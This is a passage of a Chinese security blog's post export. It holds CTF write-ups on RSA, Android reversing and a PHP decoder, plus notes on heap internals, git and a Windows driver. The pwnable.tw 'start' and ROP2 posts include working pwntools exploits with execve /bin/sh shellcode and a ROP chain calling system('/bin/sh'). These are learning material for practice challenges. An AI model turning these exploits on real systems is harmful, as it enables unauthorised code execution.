3574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533c = 168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848p = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473q = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % md=modinv(e,(p-1)*(q-1))print 'd=',dm=pow(c,d,n)print hex(m)[2:len(hex(m))-1].decode('hex') flag提交不对，不知道为什么 幂数 exp1234567891011121314a = "8842101220480224404014224202480122"a=a.split("0")flag=''for i in range(0,len(a)): str = a[i] list=[] sum=0 for j in str: list.append(j) length = len(list) for k in range(0,length): sum+=int(list[k]) flag += chr(sum+64)print flag]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-android]]></title>
    <url>%2Fjactf-android.html</url>
    <content type="text"><![CDATA[平台jactf androideasy jadx打开，查看主页面 可以直接看到程序通过得到editText的内容和23异或和代码定义的s进行对比 exp app1 jadx打开，查看主页面 通过输入和VERSION_NAME ^ VERSION_CODE相比 exp simplecheck JEB1234567891011121314151617181920212223242526272829package com.a.simplecheck;import android.content.Context;import android.os.Bundle;import android.support.v7.app.c;import android.view.View$OnClickListener;import android.view.View;import android.widget.Toast;public class MainActivity extends c &#123; public MainActivity() &#123; super(); &#125; protected void onCreate(Bundle arg4) &#123; super.onCreate(arg4); this.setContentView(0x7F04001B); this.findViewById(0x7F0B005F).setOnClickListener(new View$OnClickListener(this.findViewById(0x7F0B005E), ((Context)this)) &#123; public void onClick(View arg4) &#123; if(a.a(this.a.getText().toString())) &#123; Toast.makeText(this.b, "You get it~", 1).show(); &#125; else &#123; Toast.makeText(this.b, "Sorry its wrong", 1).show(); &#125; &#125; &#125;); &#125;&#125; 主页得到输入内容调用a类的a方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.a.simplecheck;public class a &#123; private static int[] a; private static int[] b; private static int[] c; private static int[] d; static &#123; a.a = new int[]&#123;0, 0x8BBD6FE, 205327308, 0x59E0C2D, 138810487, 408218567, 0x4A42485, 0x443BE85, 0x21929A0A, 559010506, 449018203, 576200653, 307283021, 0x1BDF218B, 314806739, 0x1459AAFB, 0x1459AAFB, 0x1C039BBC, 0x18E61B76, 342206934, 392460324, 382290309, 0xB0F0211, 364788505, 210058699, 0xBCF56CF, 0x1580960D, 440064477, 0x1310B245, 0x284EE4B3, 0x1732EFAB, 0x3175430D, 0x1FE113C4, 0x197B593C, 0x33806C28&#125;; a.b = new int[]&#123;13710, 0xB539, 0xBFFF, 36900, 0xE8AC, 0x8C2B, 0xDBD, 0xCEDD, 1509, 0xEF17, 0xF72A, 0x6C2E, 20932, 0x946D, 22069, 0x20F6, 0x84CB, 0xD032, 0x420C, 30902, 0xFC5A, 0xFA1C, 0x73BD, 0x67A9, 0x2EFA, 31610, 0xBDFF, 0x4E00, 0xB256, 0xCB04, 0xFDBC, 0xB0ED, 0xFCF0, 0x90F4&#125;; a.c = new int[]&#123;0x94F1, 0xE00B, 0x580A, 0xBA97, 8940, 0x136F, 27050, 56102, 0x5524, 0xA0D6, 0xF7D5, 0xD0CE, 0x705A, 0xE74F, 0x4017, 0xFB54, 0x930C, 0xE9F8, 0xA13C, 0x6528, 27501, 0x9820, 0x90AF, 0x9545, 0xF192, 0xA9E9, 0x2405, 9879, 0x3864, 60468, 0x4DD6, 0xB85E, 8406, 0xFC9A&#125;; a.d = new int[]&#123;0, 0xEB9D9218, -370404060, 0xF0A59DD2, -494024809, 0xF7EFFC3F, 54930974, 0xF6B60C82, 0x203630EA, 0xF99AF01A, 0xF85E01A6, 0xFCF9241, 0x1072E161, 119059597, 202392013, 0x10E88ED9, 0x786F15C, -68971076, 0xF91DD26, 0xBC673D6, 0xFF3B4367, -10293675, 0x598502B, 0x7406995, 0x9FB416F, 0x758311F, 221507, 0xF6EB9D4, 180963987, 107841171, 41609001, 0x107B88B5, 0xA21BFA2, 0x1075D862&#125;; &#125; public static boolean a(String arg8) &#123; boolean v1 = false; if(arg8.length() == a.b.length) &#123; int[] v4 = new int[a.a.length]; v4[0] = 0; byte[] v5 = arg8.getBytes(); int v6 = v5.length; int v0 = 0; int v3 = 1; while(v0 &lt; v6) &#123; v4[v3] = v5[v0]; ++v3; ++v0; &#125; v0 = 0; while(true) &#123; if(v0 &gt;= a.c.length) &#123; break; &#125; else if(a.a[v0] == a.b[v0] * v4[v0] * v4[v0] + a.c[v0] * v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + 1] == a.b[v0] * v4[v0 + 1] * v4[v0 + 1] + a.c[v0] * v4[v0 + 1] + a.d[v0]) &#123; ++v0; continue; &#125; return v1; &#125; v1 = true; &#125; return v1; &#125;&#125; a.b[v0] v4[v0] v4[v0] + a.c[v0] v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + 1] == a.b[v0] v4[v0 + 1] v4[v0 + 1] + a.c[v0] v4[v0 + 1] + a.d[v0] 可以将这句话改进一下进行爆破 exp1234567891011121314151617a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108]c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666]d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]s = ''for v0 in range(1,len(c)): for i in range(0,255): if a[v0] == b[v0] * i * i + c[v0] * i + d[v0] and a[v0] == b[v0-1] * i * i + c[v0-1] * i +d[v0-1]: s += chr(i)print s#a[v0] == b[v0] * v4[v0] * v4[v0] + c[v0] * v4[v0] + d[v0]#a[v0] == b[v0-1] * v4[v0] * v4[v0] + c[v0-1] * v4[v0] +d[v0-1]## flag&#123;MAth_i&amp;_GOOd_DON7_90V_7hInK?&#125; DDCTF-Easy jadx定位关键代码 输入的字符与i()函数返回的字符串相比较 exp1234567891011121314151617m = "com.didi_ctf.flagapp.FlagActivity"p = [-40, -62, 107, 66, -126, 103, -56, 77, 122, -107, -24, -127, 72, -63, -98, 64, -24, -5, -49, -26, 79, -70, -26, -81, 120, 25, 111, -100, -23, -9, 122, -35, 66, -50, -116, 3, -72, 102, -45, -85, 0, 126, -34, 62, 83, -34, 48, -111, 61, -9, -51, 114, 20, 81, -126, -18, 27, -115, -76, -116, -48, -118, -10, -102, -106, 113, -104, 98, -109, 74, 48, 47, -100, -88, 121, 22, -63, -32, -20, -41, -27, -20, -118, 100, -76, 70, -49, -39, -27, -106, -13, -108, 115, -87, -1, -22, -53, 21, -100, 124, -95, -40, 62, -69, 29, 56, -53, 85, -48, 25, 37, -78, 11, -110, -24, -120, -82, 6, -94, -101]q = [-57, -90, 53, -71, -117, 98, 62, 98, 101, -96, 36, 110, 77, -83, -121, 2, -48, 94, -106, -56, -49, -80, -1, 83, 75, 66, -44, 74, 2, -36, -42, -103, 6, -115, -40, 69, -107, 85, -78, -49, 54, 78, -26, 15, 98, -70, 8, -90, 94, -61, -84, 64, 112, 51, -29, -34, 126, -21, -126, -71, -31, -24, -60, -2, -81, 66, -84, 85, -91, 10, 84, 70, -8, -63, 26, 126, -76, -104, -123, -71, -126, -62, -23, 11, -39, 70, 14, 59, -101, -39, -124, 91, -109, 102, -49, 21, 105, 0, 37,-127, -57, 117, 110, -115, -86, 56, 25, -46, -55, 7, -125, 109, 76, 104, -15, 82, -53, 18, -28, -24]bArr = [i for i in range(0,len(p))]for i in range(0,len(bArr)): bArr[i] = p[i] ^ q[i]b = bArr[0]i2 = 0while bArr[b+i2] != 0: i2 += 1bArr2 = [i for i in range(0,i2)]for j in range(0,i2): bArr2[j] = bArr[b+j]print ''.join(chr(i) for i in bArr2)flag:DDCTF-3ad60811d87c4a2dba0ef651b2d93476@didichuxing.com app2 jadx 这题是有脑洞的，之前做过所以很快定位到了需要解密的字符串 AES_128_ECB_PKCS5Padding_Decrypt加密，密钥为thisisatestkey== 解密 总结 总体来说不算太难，除了最后第一是个坑之外，基本没涉及到so层的概念，是些入门很好的题目，感谢平台提供的练习机会]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw-start]]></title>
    <url>%2Fpwnable-tw-start.html</url>
    <content type="text"><![CDATA[start checksec ida查看 发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的 gdb调试得知偏移为20 exp12345678910111213141516171819202122232425from pwn import *context.arch = 'i386'context.log_level="debug"pro = remote("chall.pwnable.tw",10000)ret = 0x8048087shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'''shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',]))'''pro.readuntil("CTF:")pro.send('a'*20 + p32(ret))shell_addr = u32(pro.recv()[:4])pro.send('A'*20+p32(shell_addr+20)+shellcode)pro.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Heap的学习(1)]]></title>
    <url>%2FHeap%E7%9A%84%E5%AD%A6%E4%B9%A0-1.html</url>
    <content type="text"><![CDATA[前言 对于堆方面的内容，在没有别人帮助的情况下，学起来就很吃力，不像栈那么好理解，本篇记录我对堆的一些了解，不足之处，还望斧正。 什么是堆 栈无法满足将函数内部的数据传递到函数的外部，虽然有全局变量可以传递，但是不能动态的产生，只能在编译的时候定义，在很多情况下显得鸡肋，这时候堆(Heap)就成了一种选择。堆是一个巨大的空间，常常占据着整个虚拟空间的绝大部分，在这片空间里，程序可以请求一块连续的内存并自由使用，直到程序主动放弃之前都会有效。 堆管理 程序向操作系统申请一块适当大小的堆空间，然后有程序自己管理这块空间，具体来讲，管理着堆空间分配的往往是程序的运行库，运行库相当于从系统批发了一块较大的堆空间，然后零售给程序用，当售完或程序有大量的内存需求时，在根据实际需求再次向系统申请进货，运行库通过堆的分配算法来管理程序的对空间。 Linux下提供两种堆空间分配的方式，及两个系统调用：brk() 系统调用brk()的c语言形式声明如下：1234int brk(void* end_data_segment)实际作用就是设置进程数据段(Linux下将数据段和BSS段合在一起统称位数据段)的结束地址，及它可以扩大或缩小数据段，达到扩大或缩小堆空间的效果。glibc中还有一个函数交sbrk，它是对brk函数的封装，只不过参数和返回值略有不同，sbrk以一个增量(Increment)作为参数，及需要增加(负数为减少)的空间大小，返回值是增加或减少后数据段的结束地址 mmap() 系统调用mmap()的c语言形式声明如下：123456789void *mmap( void *start, 指定申请空间的起始地址，如果置为0，那么Linux会自动挑选合适的起始地址 size_t length, 指定申请空间的长度 int prot, 申请空间的权限(可读，可写，可执行) int flags, 映射类型(文件映射、匿名空间) int fd, 用于文件映射时指定文件描述符 off_t offset 用于文件映射时指定文件偏移);作用就是向操作系统申请一段虚拟地址空间，当然这块虚拟地址空间可以映射到某个文件(这也是这个系统跳用最初的作用)，当他不将地址空间映射到某个文件时，称这段空间为匿名空间，匿名空间可以拿来当作堆空间。 堆结构这里可以参考CTF pwn 中最通俗易懂的堆入坑指南，在看博客的时候产生一个疑问，为什么malloc(8)的值为0x21，后来自己写了程序，调试查看以及在网友的帮助下知道了原因。1264位系统malloc(8) 由于需要内存对齐，所以8需要对齐到16，然后加上pre size、size以及prev_inuse的值，也就是文中的16+8+8+1=0x21的由来，但是当malloc(24)的时候，发现系统给的空间也是0x21，这就又产生了疑问，不是应该为32+8+8+1=0x31吗，后来询问网友得知，内存空间复用这个神奇的操作，也就是当前的堆会占用下一个堆的pre size(前提：下一个堆的前一个chunk是使用状态)，所以malloc(24) 24&lt;16+8 所以，还是会分配0x21的空间给他 32位和64位原理一样，只不过，对齐的到的大小不一样，64位对齐到16，32位对齐到8 可以观察到，程序在第一次malloc之后会产生heap，并且大小是132kb，个人测试，32位也同样是132kb，往后，如果程序再malloc的时候就会从这里面申请，132kb的空间就是arena，由于是主线程分配的，所以也叫main arena top chunk的size会由于每次的malloc而减小 free函数 将free掉的chunk放在不同的bin中 1234fast binsmall binlarge binunsorted bin 总结 对于堆，总是感觉学了一遍，两遍，都不清楚到底是干嘛的，更加谈不上如何利用 Reference《程序员的自我修养》 CTF pwn 中最通俗易懂的堆入坑指南]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWN 学习—某平台ROP2 writeup]]></title>
    <url>%2FPWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html</url>
    <content type="text"><![CDATA[64位栈帧学习 writeup本能反应 RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 执行程序 发现输入一定的长度，程序就崩溃了 ida打开程序 查看要程序逻辑发现存在栈溢出漏洞输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了 查看函数表 发现函数joke 似乎用不到的函数 接下来查看字符串 我无敌的/bin/sh字符串竟然没有，还好有gets和system函数 思考利用方法 调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”); 实操过程 这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数 接下来时调用system函数 我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用 此时栈空间如图 附上payload123456789101112131415161718from pwn import *pro = remote("ip",port)pros = ELF('./rop2')bss = 0x6010F0pop_rdi_ret = 0x4008e3system_addr = pros.symbols['system']gets_addr = pros.symbols['gets']payload = 'a'*4 +'a'*8 payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)pro.readuntil("~")pro.sendline(payload)pro.sendline("/bin/sh")pro.interactive() 总结&gt; PWN 学习之路永无止境]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>pwntools</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git学习小记]]></title>
    <url>%2Fgit%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0.html</url>
    <content type="text"><![CDATA[一、设置账户名和账户邮箱123git config --global user.name "name"git config --global user.email "name@gmail.comgit config --global http.proxy http://example.com:port 二、验证账户名和账户邮箱12git config --global user.namegit config --global user.email 三、初始化仓库1git init 会生成 .git 文件夹，关于这个仓库的配置 四、添加文件及文件夹1234git add name添加所有文件git add . 五、添加描述(必须添加)1git commit -m "hello world" 六、查看状态1git status 七、查看修改的文件1git diff -- filename 八、撤销修改1git checkout filename 九、撤销修改(针对git add提交之后的)12git reset HEAD filenamegit checkout filename 十、查看提交记录1234git loggit log logid -1 -p-1 表示只看到上面的一条记录-p 表示查看这条记录的所有信息 十一、上传文件1234git remote add origin github仓库地址如遇"fatal: remote origin already exists."此问题输入 git remote rm origingit push origin master 十二、分支1234567891011121314151617181920查看分支git branch当前分支前面会有一个*创建分支git branch version1.0切换分支git checkout version1.0将version1.0同步到当前分支git merge version1.0删除分支git branch -D version1.0克隆远程项目git clone git@github.com:name/项目名.git将当前修改上传到服务器git push origin master将远程修改同步到本地git fetch origin master注：此方法不会将修改同步到当前分支，而是会同步到origin/master分支上，需要使用git merge origin/master同步到当前分支git pull origin master此方法是fetch和merge两者的合并 十三、其他1234创建密钥ssh-keygen -t rsa -C "name@gmail.com"将公钥添加到githubcat .ssh/id_rsa.pub]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[attackworld-web2]]></title>
    <url>%2Fattackworld-web2.html</url>
    <content type="text"><![CDATA[源码12345678910111213141516171819202122&lt;?php $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"; function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_))); &#125; highlight_file(__FILE__); /* 逆向加密算法，解密$miwen就是flag */ ?&gt; 分析 源码：反转字符-每位字符加一-base64-字符反转-rot13解码：rot13-字符反转-base64-每位字符减一-字符反转 脚本12345678910111213141516171819202122232425262728293031323334353637import base64def Upper(ch): if ch&gt;='A' and ch&lt;='Z': return Truedef Lower(ch): if ch&gt;='a' and ch&lt;='z': return Truedef rot13(s): flag = '' for i in s: if Upper(i) == True: if i&gt;='A' and i&lt;='M': flag += chr(ord(i)+13) else: flag += chr(ord(i)-13) elif Lower(i) == True: if i&gt;='a' and i&lt;='m': flag += chr(ord(i)+13) else: flag += chr(ord(i)-13) else: flag += i return flagflag = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"flag = list(rot13(flag))flag.reverse()flag = ''.join(i for i in flag)flag = base64.b64decode(flag)flag = list(flag)strs = ""for i in range(0,len(flag)): strs += chr(ord(flag[i]) -1)strs = list(strs)strs.reverse()print ''.join(i for i in strs)]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WDF-helloworld]]></title>
    <url>%2FWDF-helloworld.html</url>
    <content type="text"><![CDATA[Windows WDF驱动开发简单helloworld入门 helloworld.h12345678910111213141516171819202122232425262728293031323334353637383940414243/*预处理：用来避免头文件被重复包含还可以用#pragma once 防止头文件被重复包含，保证头文件只被编译一次，可移植性差第一种： #ifndef __SOMEFILE_H__ #define __SOMEFILE_H__ ... ... // 声明、定义语句 #endif第二种： #pragma once ... ... // 声明、定义语句*/#ifndef __HELLOWORLD__ //预处理#define __HELLOWORLD__ //预处理// 包含驱动所需的头文件#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;// 这是一个结构体的定义，用以描述驱动程序的设备拓展。它保存了我们自定义所需的一些信息，有助于更加方便的编程。typedef struct _DEVICE_EXTENSION &#123; PDEVICE_OBJECT DeviceObject; UNICODE_STRING DeviceName; UNICODE_STRING SymbolicLink;&#125; DEVICE_EXTENSION, *PDEVICE_EXTENSION;// 相关函数的声明，这些函数的具体实现存在于定义文件中NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegPath);VOID DriverUnload( IN PDRIVER_OBJECT DriverObject);NTSTATUS DefaultDispath( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);#endif //预处理 helloworld.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135// 包含指定的声明文件。为每个定义文件写一个声明文件是一个不错的选择#include "helloworld.h"// 这些是预处理。在驱动开发中，需要指定每一个函数是分页内存还是非分页内存。// INIT 标识是指定函数在驱动加载时使用，是初始化相关函数，驱动成功加载以后可以从内存卸载。// PAGE 标识是指此函数在驱动运行时可以被交换到磁盘上，如果不指定，编译器默认是非分页内存。// 一般情况下，我们不需要考虑这些问题，但有些特殊情况，代码是不予许被交换到磁盘上的，否则导致系统蓝屏或重启。// 注：函数的声明必须在这些指定内存分配的预处理器之前，否则无法通过编译。#pragma alloc_text(INIT,DriverEntry)#pragma alloc_text(PAGE,DefaultDispatch)#pragma alloc_text(PAGE,DriverUnload)// 是DriverEntry函数的具体实现。DriverEntry是驱动程序的入口函数。有操作系统内核的I/O管理器调用。NTSTATUS DriverEntry( IN PDRIVER_OBJECT Driver, IN PUNICODE_STRING RegPath) &#123; // 函数相关变量的定义 // C语言中变量必须定义在函数体的开始处，否则出现编译错误。 // C++ 语言没有这种限制 NTSTATUS status; PDEVICE_OBJECT deviceObject; PDEVICE_EXTENSION deviceExtension; UNICODE_STRING symbolicLink; UNICODE_STRING deviceName; ULONG i; // KdPrint 和 DbgPrint是一个函数，KdPrint 是 DbgPrint的宏定义凡是，用以打印调试信息，好处在于 // 调试版本编译时，KdPrint会打印调试信息， // 发布版本编译时，KdPrint将会被全部移除。 KdPrint(("Enter HelloWorld DriverEntry\n")); // 一个宏，经常被用来指定参数未被引用，可以避免不必要的警告 // 做到开发驱动程序不出警告是基础，因为驱动程序会导致系统出现各种各样的问题 UNREFERENCED_PARAMETER(RegPath); // 对一个Unicode字符串进行初始化，Windows内核大量使用Unicode字符串，其具体操作有一系列函数(Rtl系列，微软推荐的运行时函数) RtlInitUnicodeString(&amp;deviceName, L"\\Device\\helloworld"); // 宏IRP_MJ_MAXIMUM_FUNCTION代表驱动程序最大的派遣函数指针数，这里使用默认的派遣函数初始化他们。然后紧跟着下面修改我们不打算使用默认的派遣函数指针。 // 类似于定义数组，初始化数组 // 派遣函数：又被称为回调函数。在驱动程序中这些派遣函数是我们主要工作重点 for (i = 0; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++) &#123; Driver-&gt;MajorFunction[i] = DefaultDispatch; &#125; // 卸载函数，这个派遣函数需要单独提供，如果不打算对驱动程序进行卸载，这个函数可以不用提供。 Driver-&gt;DriverUnload = DriverUnload; // 提供给操作系统的创建，关闭，读写的派遣函数，还有更多的派遣函数需要提供，这里为了简单明了用DefaultDispatch替换 Driver-&gt;MajorFunction[IRP_MJ_CREATE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_CLOSE] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_READ] = DefaultDispatch; Driver-&gt;MajorFunction[IRP_MJ_WRITE] = DefaultDispatch; // 使用IoCreateDevice函数创建一个设备对象，其名称为helloworld，其设备类型为FILE_DEVICE_UNKNOWN，是一种独占设备，在运行时，只能被一个程序所使用。 status = IoCreateDevice(Driver, sizeof(DEVICE_EXTENSION), &amp;deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;deviceObject); // 判断设备是否创建成功，并进行必要的失败处理，这对于驱动程序的健壮性起着不容忽视的作用。 if (!NT_SUCCESS(status)) &#123; return status; &#125; // 设备标识。有BUFFERED_IO 和 DO_BUFFERED_IO 两种，代表两种不同的缓冲区处理方式 deviceObject-&gt;Flags = DO_BUFFERED_IO; // 初始化了一个Unicode字符串，同时也初始化了声明文件中定义过的设备拓展的结构体，设备拓展中保存了我们自定义所需的一些信息。 deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; deviceExtension-&gt;DeviceObject = deviceObject; deviceExtension-&gt;DeviceName = deviceName; RtlInitUnicodeString(&amp;symbolicLink, L"\\??\\helloworld"); deviceExtension-&gt;SymbolicLink = symbolicLink; //使用IoCreateSymbolicLink函数创建设备符号链接，这个符号链接名，主要用来与应用程序进行通信 status = IoCreateSymbolicLink(&amp;symbolicLink, &amp;deviceName); //对创建结果进行必要的失败处理，如果创建失败，就删除已创建的设备对象 if (!NT_SUCCESS(status)) &#123; IoDeleteDevice(deviceObject); return status; &#125; KdPrint(("End HelloWorld DriverEntry\n")); return status;&#125;// DriverUnload函数的具体实现，功能是删除设备对象和设备符号链接，如果DriverEntry函数分配了其他资源，也要在这里释放VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) &#123; PDEVICE_OBJECT deviceObject; UNICODE_STRING linkName; KdPrint(("Enter HelloWorld DriverUnload\n")); // 由驱动对象指针得到设备对象指针 deviceObject = DriverObject-&gt;DeviceObject; // 遍历所有已经穿件的设备对象和设备符号链接，并将其删除 while (NULL != deviceObject) &#123; PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)deviceObject-&gt;DeviceExtension; linkName = deviceExtension-&gt;SymbolicLink; IoDeleteSymbolicLink(&amp;linkName); deviceObject = deviceObject-&gt;NextDevice; IoDetachDevice(deviceExtension-&gt;DeviceObject); &#125; KdPrint(("End of HelloWorld DriverUnload"));&#125;// DefaultDispatch函数的具体实现，功能是直接完成IRP(Input/Output Request Package，输入输出请求包)NTSTATUS DefaultDispatch( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)&#123; NTSTATUS status; KdPrint(("Enter HelloWorld DefaultDispatch")); // 指定参数未被引用，避免不必要的警告 UNREFERENCED_PARAMETER(DeviceObject); // 设置IRP的状态为成功 status = STATUS_SUCCESS; // 因为打算直接完成IRP，所以操作信息的长度为空，这里将字节处理长度信息设置为0 Irp-&gt;IoStatus.Status = status; Irp-&gt;IoStatus.Information = 0; // 使用IoCompleteRequest函数直接完成IRP IoCompleteRequest(Irp, IO_NO_INCREMENT); KdPrint(("End of HelloWorld DefaultDispatch\n")); return status;&#125; 驱动开发所需要的工具 Windbg：和VM配合实现双机联合调试，完成双机调试功能，可以结合《软件调试》这本书对Windbg有较为深入的认识。 DebugView： 可以捕获程序中由TRACE(debug版本)和OutputDebugString输出的信息。 InstDrv：安装驱动程序的软件，也可以自己编写。 DriverMonitor：用于查看驱动程序中的各种打印信息，帮助我们进行相应的信息显示与具体的设计。 DeviceTree：设备树，查看驱动对象和设备对象。 PcHunter（XueTr）：较高权限的内核对象查看工具，相当于任务管理器的加强版。 WinObj：驱动对象和设备对象的普通查看工具]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>Windows wdf驱动开发</tag>
        <tag>WDF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KLEE-符号执行框架]]></title>
    <url>%2FKLEE-%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6.html</url>
